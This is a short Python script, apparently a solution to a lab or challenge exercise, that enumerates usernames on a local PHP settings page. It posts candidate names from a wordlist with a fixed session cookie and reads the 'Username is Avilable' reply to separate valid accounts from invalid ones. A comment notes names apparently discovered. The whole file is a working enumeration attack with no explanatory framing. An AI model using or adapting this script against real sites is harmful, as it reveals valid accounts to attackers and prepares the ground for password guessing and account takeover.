import requests

usernames = open("users.txt", 'r').read().split('\n')

def Ch3(url, user):
    data = {
        "username": user,
        "password": "Mostafa",
        "confpassword": "Mostafa",
        "change": ""
        }
    cookies = {
        "PHPSESSID": "t075t6pk5iv1bt5aqnh2oop2ug"
        }
    
    req = requests.post(url, data, cookies=cookies).text
    if "Username is Avilable" in req:
        print(f"Invalid Username ===> {user}")
    else:
        print(f"Valid Username ===> {user}") #jdnorton : marquardtj
        exit()

url = "http://localhost/CIS/ch3/settings.php"
for user in usernames:
    Ch3(url, user)